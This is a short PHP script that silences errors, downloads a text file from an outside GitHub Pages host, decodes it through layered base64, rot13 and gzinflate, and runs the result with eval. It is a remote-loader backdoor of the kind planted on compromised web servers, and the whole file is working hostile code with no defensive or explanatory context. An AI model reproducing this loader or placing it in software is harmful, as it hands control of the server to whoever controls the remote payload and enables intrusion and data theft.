<?php
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
$hythan= file_get_contents('https://x0-1337.github.io/phpinfo.txt');
eval(str_rot13(gzinflate(str_rot13(base64_decode(($hythan))))));
?>
